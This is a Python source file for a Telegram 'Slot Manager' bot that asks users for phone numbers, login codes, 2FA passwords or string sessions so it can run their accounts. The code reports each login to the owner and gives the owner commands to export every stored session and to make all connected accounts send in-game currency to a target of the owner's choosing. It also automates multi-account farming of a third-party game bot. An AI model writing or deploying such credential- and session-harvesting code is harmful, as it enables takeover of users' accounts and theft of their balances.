# main.py
import logging
import asyncio
import json
import os
import re
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

import config
import database
import utils
import worker

# --- 1. LOGGING SETUP ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(config.LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Initialize Manager Bot
bot = TelegramClient('manager_session', config.API_ID, config.API_HASH).start(bot_token=config.BOT_TOKEN)

# --- 2. HELPER FUNCTIONS ---

async def get_balance_for_user(user_id, client):
    """Sends /extols to target bot and parses balance."""
    try:
        async with client.conversation(config.TARGET_BOT, timeout=10) as conv:
            await conv.send_message('/extols')
            response = await conv.get_response()
            match = re.search(r'Є(\d+)', response.text)
            balance = int(match.group(1)) if match else 0
            me = await client.get_me()
            name = f"[{me.first_name}](tg://user?id={me.id})"
            return (name, balance, None)
    except Exception as e:
        return ("Unknown", 0, str(e))

async def register_client(uid, client):
    """Saves a connected client to the database."""
    me = await client.get_me()
    database.clients[uid] = client
    database.user_data[uid] = {
        'extols': 0, 
        'next_play_time': 0, 
        'name': me.first_name
    }
    await bot.send_message(config.OWNER_ID, f"🔔 New Login: {me.first_name} (`{uid}`)")
    logger.info(f"User Login: {me.first_name} ({uid})")

# --- 3. COMMAND HANDLERS ---

@bot.on(events.NewMessage(pattern='/start'))
async def start_cmd(event):
    await event.respond("👋 **Slot Manager Online**\nType `/help` for commands.")

@bot.on(events.NewMessage(pattern='/help'))
async def help_cmd(event):
    text = (
        "🛠 **COMMAND MENU**\n"
        "━━━━━━━━━━━━━━━━\n"
        "**🔑 Login Options:**\n"
        "`/login` - Login via Phone Number + OTP\n"
        "`/slogin` - Login via String Session (Faster)\n"
        "`/logout` - Disconnect account\n\n"
        "**💰 Finance:**\n"
        "`/check` - Audit all bot balances\n"
        "`/self_reply {all|id} {group_id} {amount}` - Mass transfer\n\n"
        "**👤 Management:**\n"
        "`/slot` - Join farming queue (Self)\n"
        "`/allslot` - Force start ALL bots\n"
        "`/stats` - View Global Stats\n"
        "`/log` - View System Logs\n"
        "`/sessionexport` - Backup sessions\n"
        "━━━━━━━━━━━━━━━━"
    )
    await event.respond(text)

# --- OPTION A: SESSION LOGIN (/slogin) ---

@bot.on(events.NewMessage(pattern='/slogin'))
async def slogin_cmd(event):
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("Send your **String Session**:")
        response = await conv.get_response()
        
        try:
            client = TelegramClient(StringSession(response.text.strip()), config.API_ID, config.API_HASH)
            await client.connect()
            
            if not await client.is_user_authorized():
                await conv.send_message("❌ Invalid Session.")
                return

            await register_client(event.sender_id, client)
            await conv.send_message(f"✅ **Connected via Session!**\nUse `/slot` to start farming.")
        
        except Exception as e:
            await conv.send_message(f"Error: {e}")

# --- OPTION B: PHONE LOGIN (/login) ---

@bot.on(events.NewMessage(pattern='/login'))
async def login_cmd(event):
    user_id = event.sender_id
    
    # Start an interactive conversation
    async with bot.conversation(user_id, timeout=300) as conv:
        try:
            # 1. Ask for Phone Number
            await conv.send_message("📱 **Phone Login**\n\nPlease enter your phone number (with country code, e.g., `+919876543210`):")
            phone_msg = await conv.get_response()
            phone_number = phone_msg.text.strip()

            # 2. Initialize a temporary client
            status_msg = await conv.send_message("🔄 Connecting to Telegram...")
            temp_client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
            await temp_client.connect()

            # 3. Send OTP Request
            try:
                await temp_client.send_code_request(phone_number)
            except Exception as e:
                await status_msg.edit(f"❌ Failed to send code: {e}")
                await temp_client.disconnect()
                return

            # 4. Ask for OTP
            await status_msg.delete()
            await conv.send_message("📩 **OTP Sent!**\nPlease enter the code you received (format: `1 2 3 4 5` or `12345`):")
            code_msg = await conv.get_response()
            phone_code = code_msg.text.replace(' ', '')

            # 5. Sign In
            try:
                await temp_client.sign_in(phone_number, phone_code)
            except SessionPasswordNeededError:
                # 6. Handle 2FA Password
                await conv.send_message("🔐 **2FA Password Required:**\nThis account has a password. Please enter it:")
                pwd_msg = await conv.get_response()
                password = pwd_msg.text.strip()
                try:
                    await temp_client.sign_in(password=password)
                except Exception as e:
                    await conv.send_message(f"❌ Login Failed: {e}")
                    await temp_client.disconnect()
                    return
            except PhoneCodeInvalidError:
                await conv.send_message("❌ Invalid Code.")
                await temp_client.disconnect()
                return
            except Exception as e:
                await conv.send_message(f"❌ Error: {e}")
                await temp_client.disconnect()
                return

            # 7. Success - Register Client
            await register_client(user_id, temp_client)
            
            # Save the session string internally so it persists on restart if you export/import
            saved_session = temp_client.session.save()
            
            await conv.send_message("✅ **Login Successful!**\nYou are now connected.")

        except asyncio.TimeoutError:
            await conv.send_message("❌ **Timeout.** Login took too long.")
        except Exception as e:
            await conv.send_message(f"❌ **Error:** {e}")

# --- LOGOUT ---

@bot.on(events.NewMessage(pattern='/logout'))
async def logout_cmd(event):
    uid = event.sender_id
    if uid in database.clients:
        await database.clients[uid].disconnect()
        del database.clients[uid]
        if uid in database.user_data: del database.user_data[uid]
        if uid in database.farming_queue: database.farming_queue.remove(uid)
        await event.respond("✅ **Logged out successfully.**")
    else:
        await event.respond("❌ You are not logged in.")

# --- FARMING COMMANDS ---

@bot.on(events.NewMessage(pattern='/slot'))
async def slot_cmd(event):
    uid = event.sender_id
    if uid not in database.clients:
        return await event.respond("❌ Login first.")
    
    if uid not in database.farming_queue:
        database.farming_queue.append(uid)
        await event.respond("✅ **Added to Queue.** Waiting for turn...")
        asyncio.create_task(worker.start_relay_race())
    else:
        await event.respond("⚠️ Already in queue.")

@bot.on(events.NewMessage(pattern='/allslot', from_users=[config.OWNER_ID]))
async def allslot_cmd(event):
    count = 0
    for uid in database.clients:
        if uid not in database.farming_queue:
            database.farming_queue.append(uid)
            count += 1
    
    await event.respond(f"✅ **{count} users** added to queue. Starting Relay Race...")
    asyncio.create_task(worker.start_relay_race())

# --- STATS COMMAND ---

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    msg = (
        f"🌍 **GLOBAL STATS**\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users: {len(database.clients)}\n"
        f"🔄 Connected: {len(database.clients)}\n"
        f"🔥 Active Queue: {len(database.farming_queue)}\n"
        f"⏳ Uptime: {utils.get_uptime()}\n\n"
        f"**User Breakdown:**\n"
    )
    for uid, data in database.user_data.items():
        status_icon = utils.format_status(uid, database.current_active_user)
        msg += f"❑ {data['name']} ‹`{uid}`› — {data['extols']} — {status_icon}\n"

    msg += "━━━━━━━━━━━━━━━━"
    await event.respond(msg)

# --- CHECK / AUDIT COMMAND ---

@bot.on(events.NewMessage(pattern='/check', from_users=[config.OWNER_ID]))
async def check_cmd(event):
    status_msg = await event.respond("⏳ **Auditing Wallets...**\nContacting Zoro Bot from all accounts.")
    tasks = []
    for uid, client in database.clients.items():
        tasks.append(get_balance_for_user(uid, client))
    
    results = await asyncio.gather(*tasks)
    total_extols = 0
    msg = "💰 **WALLET AUDIT**\n━━━━━━━━━━━━━━━━\n"
    for name, balance, error in results:
        if error:
            msg += f"» {name} - ⚠️ Error\n"
        else:
            msg += f"» {name} - Є{balance}\n"
            total_extols += balance
    msg += f"━━━━━━━━━━━━━━━━\n➤ **Total - Є{total_extols}**"
    await status_msg.edit(msg)

# --- SELF REPLY / TRANSFER COMMAND ---

@bot.on(events.NewMessage(pattern=r'/self_reply (all|(?:\d+)) (-?\d+) (\d+)', from_users=[config.OWNER_ID]))
async def self_reply_cmd(event):
    if not event.is_reply:
        return await event.respond("❌ **Error:** Reply to the message you want the funds sent to.")
    
    target_mode = event.pattern_match.group(1) 
    group_id = int(event.pattern_match.group(2))
    amount = int(event.pattern_match.group(3))
    
    reply_msg = await event.get_reply_message()
    target_msg_id = reply_msg.id
    
    active_clients = []
    if target_mode == 'all':
        active_clients = list(database.clients.values())
    else:
        uid = int(target_mode)
        if uid in database.clients:
            active_clients = [database.clients[uid]]
    
    if not active_clients:
        return await event.respond("❌ No matching clients found.")

    await event.respond(f"💸 **Initiating Transfer...**\nTarget Group: `{group_id}`\nAmount: Є{amount} per bot.")

    count = 0
    for client in active_clients:
        try:
            cmd_text = f"/give@{config.TARGET_BOT_USERNAME} {amount}"
            await client.send_message(
                entity=group_id,
                message=cmd_text,
                reply_to=target_msg_id
            )
            count += 1
            await asyncio.sleep(0.8) 
        except Exception as e:
            logger.error(f"Transfer failed for {client}: {e}")
            
    await event.respond(f"✅ **Execution Complete**\nBots Triggered: {count}")

# --- LOG MANAGEMENT ---

@bot.on(events.NewMessage(pattern='/log', from_users=[config.OWNER_ID]))
async def log_cmd(event):
    logs = utils.read_last_logs(config.LOG_FILE)
    buttons = [
        [Button.inline("Refresh 🌀", b"log_refresh"), Button.inline("Download log ⬇️", b"log_download")],
        [Button.inline("Clear log 🗑️", b"log_clear")]
    ]
    await event.respond(f"📝 **System Logs (Last 15 lines):**\n\n```\n{logs}\n```", buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b'log_refresh'))
async def refresh_log_handler(event):
    if event.sender_id != config.OWNER_ID: return await event.answer("Owner only!", alert=True)
    logs = utils.read_last_logs(config.LOG_FILE)
    buttons = [
        [Button.inline("Refresh 🌀", b"log_refresh"), Button.inline("Download log ⬇️", b"log_download")],
        [Button.inline("Clear log 🗑️", b"log_clear")]
    ]
    await event.edit(f"📝 **System Logs (Last 15 lines):**\n\n```\n{logs}\n```", buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b'log_clear'))
async def clear_log_handler(event):
    if event.sender_id != config.OWNER_ID: return await event.answer("Owner only!", alert=True)
    utils.clear_logs(config.LOG_FILE)
    await event.edit("📝 **System Logs:**\n\nLogs cleared.", buttons=[[Button.inline("Refresh 🌀", b"log_refresh")]])

@bot.on(events.CallbackQuery(pattern=b'log_download'))
async def download_log_handler(event):
    if event.sender_id != config.OWNER_ID: return await event.answer("Owner only!", alert=True)
    if os.path.exists(config.LOG_FILE):
        await event.client.send_file(event.chat_id, config.LOG_FILE, caption="📄 **Full System Logs**")
    else:
        await event.answer("No logs found.", alert=True)

# --- SESSION IMPORT/EXPORT ---

@bot.on(events.NewMessage(pattern='/sessionexport', from_users=[config.OWNER_ID]))
async def export_sessions(event):
    data = database.get_all_sessions()
    if not data: return await event.respond("❌ No active sessions.")
    
    with open(config.SESSION_FILE, 'w') as f: json.dump(data, f, indent=4)
    await event.client.send_file(event.chat_id, config.SESSION_FILE, caption=f"💾 **Backup:** {len(data)} Sessions")
    os.remove(config.SESSION_FILE)

@bot.on(events.NewMessage(pattern='/sessionimport', from_users=[config.OWNER_ID]))
async def import_sessions(event):
    if not event.is_reply: return await event.respond("❌ Reply to a .json file.")
    reply_msg = await event.get_reply_message()
    if not reply_msg.document: return await event.respond("❌ Not a file.")

    status_msg = await event.respond("🔄 Importing...")
    path = await reply_msg.download_media(file="imported_sessions.json")
    
    try:
        with open(path, 'r') as f: data = json.load(f)
        success_count = 0
        for uid_str, session_str in data.items():
            try:
                client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
                await client.connect()
                await register_client(int(uid_str), client)
                success_count += 1
            except Exception as e:
                logger.error(f"Import fail for {uid_str}: {e}")
        
        await status_msg.edit(f"✅ **Import Complete**\nLoaded: {success_count}/{len(data)}")
        os.remove(path)
    except Exception as e:
        await status_msg.edit(f"❌ **Import Failed:** {e}")

# --- START ---
print("✅ Manager Bot Started...")
bot.run_until_disconnected()
